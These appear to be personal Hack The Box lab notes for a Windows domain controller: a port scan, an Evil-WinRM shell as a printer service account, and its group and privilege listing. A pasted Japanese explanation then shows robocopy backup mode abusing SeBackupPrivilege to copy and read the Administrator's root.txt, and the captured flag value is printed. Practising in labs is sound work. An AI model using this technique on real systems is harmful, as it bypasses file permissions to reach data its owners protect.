https://app.hackthebox.com/machines/401

## STEP 1
```sh
└─$ rustscan -a 10.129.100.185 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.100.185:53
Open 10.129.100.185:80
Open 10.129.100.185:88
Open 10.129.100.185:135
Open 10.129.100.185:139
Open 10.129.100.185:389
Open 10.129.100.185:445
Open 10.129.100.185:464
Open 10.129.100.185:593
Open 10.129.100.185:636
Open 10.129.100.185:3268
Open 10.129.100.185:3269
Open 10.129.100.185:5985
Open 10.129.100.185:9389
Open 10.129.100.185:47001
Open 10.129.100.185:49665
Open 10.129.100.185:49667
Open 10.129.100.185:49664
Open 10.129.100.185:49666
Open 10.129.100.185:49674
Open 10.129.100.185:49671
Open 10.129.100.185:49675
Open 10.129.100.185:49677
Open 10.129.100.185:49681
Open 10.129.100.185:49697
10.129.100.185 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49665,49667,49664,49666,49674,49671,49675,49677,49681,49697]
```


## STEP 2


## STEP 3
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> get-acl C:\Users\svc-printer\Desktop\user.txt | Format-Table -AutoSize -Wrap


    Directory: C:\Users\svc-printer\Desktop


Path     Owner              Access
----     -----              ------
user.txt RETURN\svc-printer RETURN\Administrator Allow  FullControl
                            NT AUTHORITY\SYSTEM Allow  FullControl
                            BUILTIN\Administrators Allow  FullControl
                            RETURN\svc-printer Allow  FullControl


*Evil-WinRM* PS C:\Users\svc-printer\Documents> get-acl C:\Users\administrator\Desktop\root.txt | Format-Table -AutoSize -Wrap


    Directory: C:\Users\administrator\Desktop


Path     Owner                  Access
----     -----                  ------
root.txt BUILTIN\Administrators RETURN\Administrator Allow  FullControl
                                NT AUTHORITY\SYSTEM Allow  FullControl
                                BUILTIN\Administrators Allow  FullControl
                                RETURN\Administrator Allow  FullControl
```
短く結論：SeBackupPrivilege が有効でも、通常のファイル読み取り（type, Get-Content 等）はNTFS ACL に従うため拒否されます。SeBackupPrivilege を使ってファイルを取り出すには バックアップ用 API / バックアップモードを使うツール を使う必要があります。代表的で手っ取り早い方法は robocopy の /B オプション（backup mode）です。以下に理由と実例コマンド、代替手段を説明します。

mkdir C:\temp\exfil
robocopy "C:\Users\administrator\Desktop" "C:\temp\exfil" "root.txt" /B /NFL /NDL /NJH /NJS
type C:\temp\exfil\root.txt
説明：

/B = backup mode（SeBackupPrivilege を用いて ACL を回避してコピー）

/NFL /NDL /NJH /NJS は不要な出力を抑えるオプション（任意）

成功すれば C:\temp\exfil\root.txt にファイルが作られ、中身を type や Get-Content で読めます。

もし Access denied や ERROR 5 が出たら、robocopy がバックアップ特権を実際に使えていない可能性があります（例：あなたのシェルプロセスに特権が有効でも子プロセスで無効になっている等）。
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> mkdir C:\temp\exfil


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/6/2025  12:59 AM                exfil


*Evil-WinRM* PS C:\Users\svc-printer\Documents> robocopy "C:\Users\administrator\Desktop" "C:\temp\exfil" "root.txt" /B /NFL /NDL /NJH /NJS

*Evil-WinRM* PS C:\Users\svc-printer\Documents> type C:\temp\exfil\root.txt
278a2f7f1595036f612ce6fcfce54b52
```
